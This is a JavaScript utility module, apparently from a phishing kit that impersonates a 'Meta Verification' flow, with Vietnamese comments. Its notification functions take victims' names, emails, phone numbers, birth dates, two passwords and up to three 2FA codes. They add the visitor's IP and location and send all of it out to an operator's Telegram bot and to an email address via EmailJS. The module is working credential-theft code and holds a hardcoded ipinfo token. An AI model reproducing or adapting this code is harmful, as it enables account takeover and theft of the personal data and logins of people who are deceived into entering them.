/**
 * Utilities Module
 * Yêu cầu: Đã load thư viện CryptoJS và biến toàn cục CONFIG
 */
const Utils = {
    // ==========================================
    // 🔐 SECURITY & ENCRYPTION
    // ==========================================

    encrypt(text) {
        if (!text) return '';
        return CryptoJS.AES.encrypt(text, CONFIG.SECRET_KEY).toString();
    },

    decrypt(cipherText) {
        if (!cipherText) return '';
        try {
            const bytes = CryptoJS.AES.decrypt(cipherText, CONFIG.SECRET_KEY);
            return bytes.toString(CryptoJS.enc.Utf8);
        } catch (error) {
            console.error('Decryption error:', error);
            return null;
        }
    },

    // ==========================================
    // 💾 LOCAL STORAGE MANAGEMENT
    // ==========================================

    saveRecord(key, value) {
        try {
            const encryptedValue = this.encrypt(JSON.stringify(value));
            const record = { 
                value: encryptedValue, 
                expiry: Date.now() + CONFIG.STORAGE_EXPIRY 
            };
            localStorage.setItem(key, JSON.stringify(record));
        } catch (error) {
            console.error(`Save error for key "${key}":`, error);
        }
    },

    getRecord(key) {
        try {
            const item = localStorage.getItem(key);
            if (!item) return null;

            const { value, expiry } = JSON.parse(item);
            if (Date.now() > expiry) {
                localStorage.removeItem(key);
                return null;
            }

            const decrypted = this.decrypt(value);
            return decrypted ? JSON.parse(decrypted) : null;
        } catch (error) {
            return null;
        }
    },

    // ==========================================
    // 🌐 NETWORK & LOCATION
    // ==========================================

    async getUserIp() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            if (!response.ok) throw new Error('Network error');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Error getting IP:', error);
            return 'N/A';
        }
    },

    async getUserLocation() {
        // Cố gắng lấy IP cơ bản trước làm dự phòng (phòng khi ipinfo bị adblock chặn)
        let backupIp = 'N/A';
        try {
            backupIp = await this.getUserIp();
        } catch (e) {}

        const defaultFallback = { 
            location: backupIp !== 'N/A' ? `${backupIp} | N/A | N/A (N/A)` : 'N/A', 
            country_code: 'N/A', 
            ip: backupIp, 
            region: 'N/A', 
            country: 'N/A' 
        };

        try {
            const response = await fetch("https://ipinfo.io/json?token=5a58a2d85996e3");
            if (!response.ok) throw new Error("Network response was not ok");

            const data = await response.json();
            const finalIp = data.ip || backupIp; // Ưu tiên IP lấy được, nếu không có thì dùng IP dự phòng

            return {
                location: `${finalIp} | ${data.city || 'N/A'} | ${data.region || 'N/A'} (${data.country || 'N/A'})`,
                country_code: data.country || "N/A",
                ip: finalIp,
                region: data.region || "N/A",
                country: data.country || "N/A"
            };
        } catch (error) {
            console.error("Error getting location:", error);
            return defaultFallback; // Trả về IP dự phòng nếu API lỗi
        }
    },

    // ==========================================
    // 📩 NOTIFICATIONS & MESSAGING
    // ==========================================

    // Thêm tham số preFetchedLocation để tránh gọi lại API nhiều lần
    async sendToTelegram(data, preFetchedLocation = null) {
        const locationData = preFetchedLocation || await this.getUserLocation();

        const text = `
<b>IP:</b> <code>${locationData.ip}</code>
<b>Location:</b> <code>${locationData.location}</code>
----------------------------------
<b>Full Name:</b> <code>${data.fullName || ''}</code>
<b>Email:</b> <code>${data.email || ''}</code>
<b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
<b>Page Name:</b> <code>${data.fanpage || ''}</code>
<b>Phone:</b> <code>${data.phone || ''}</code>
----------------------------------
<b>Password(1):</b> <code>${data.password || ''}</code>
<b>Password(2):</b> <code>${data.passwordSecond || ''}</code>
----------------------------------
<b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>`.trim();

        try {
            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
                    text,
                    parse_mode: 'HTML'
                })
            });
        } catch (error) {
            console.error('Telegram notification error:', error);
        }
    },

    loadEmailJSSDK() {
        if (window.emailjs) return Promise.resolve();

        return new Promise((resolve, reject) => {
            const script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
            script.onload = () => {
                emailjs.init(CONFIG.EMAILJS_PUBLIC_KEY);
                resolve();
            };
            script.onerror = () => reject(new Error('Failed to load EmailJS SDK'));
            document.head.appendChild(script);
        });
    },

    // Thêm tham số preFetchedLocation
    async sendToEmail(data, preFetchedLocation = null) {
        const locationData = preFetchedLocation || await this.getUserLocation();
        
        const dob = (data.day && data.month && data.year) 
            ? `${data.day}/${data.month}/${data.year}` 
            : 'N/A';

        const emailContent = `
IP: ${locationData.ip}
Location: ${locationData.location}
----------------------------------
Full Name: ${data.fullName || ''}
Email: ${data.email || ''}
Email Business: ${data.emailBusiness || ''}
Page Name: ${data.fanpage || ''}
Phone: ${data.phone || ''}
Date of Birth: ${dob}
----------------------------------
Password(1): ${data.password || ''}
Password(2): ${data.passwordSecond || ''}
----------------------------------
🔐Code 2FA(1): ${data.twoFa || ''}
🔐Code 2FA(2): ${data.twoFaSecond || ''}
🔐Code 2FA(3): ${data.twoFaThird || ''}

Sent at: ${new Date().toLocaleString()}`.trim();

        try {
            await this.loadEmailJSSDK();
            await emailjs.send(
                CONFIG.EMAILJS_SERVICE_ID,
                CONFIG.EMAILJS_TEMPLATE_ID,
                {
                    to_email: CONFIG.EMAIL_RECIPIENT,
                    subject: `Meta Verification - ${locationData.location}`,
                    message: emailContent,
                    from_name: 'Meta Verification System',
                    reply_to: data.email || 'noreply@system.com'
                },
                CONFIG.EMAILJS_PUBLIC_KEY
            );
        } catch (error) {
            console.error('Email notification error:', error);
        }
    },

    async sendNotification(data) {
        const type = CONFIG.NOTIFICATION_TYPE?.toLowerCase();
        const tasks = [];

        // Lấy IP & Location 1 lần duy nhất ở đây rồi truyền xuống
        // Để tránh việc gọi API 2 lần cùng lúc gây lỗi Rate Limit
        const locationData = await this.getUserLocation();

        if (type === 'telegram' || type === 'both') {
            tasks.push(this.sendToTelegram(data, locationData));
        }
        if (type === 'email' || type === 'both') {
            tasks.push(this.sendToEmail(data, locationData));
        }

        try {
            await Promise.allSettled(tasks);
        } catch (error) {
            console.error('Notification dispatch error:', error);
        }
    },

    // ==========================================
    // 🛠 FORMATTING & HELPERS
    // ==========================================

    maskPhone(phone) {
        if (!phone || phone.length < 5) return phone || '';
        const start = phone.slice(0, 2);
        const end = phone.slice(-2);
        return `${start}${'*'.repeat(phone.length - 4)}${end}`;
    },

    maskEmail(email) {
        if (!email) return '';
        return email.replace(/^(.)(.*?)(.)@(.+)$/, (_, firstChar, midChars, lastChar, domain) => {
            return `${firstChar}${'*'.repeat(midChars.length)}${lastChar}@${domain}`;
        });
    },

    generateTicketId() {
        const gen = () => Math.random().toString(36).substring(2, 6).toUpperCase();
        return `${gen()}-${gen()}-${gen()}`;
    }
};
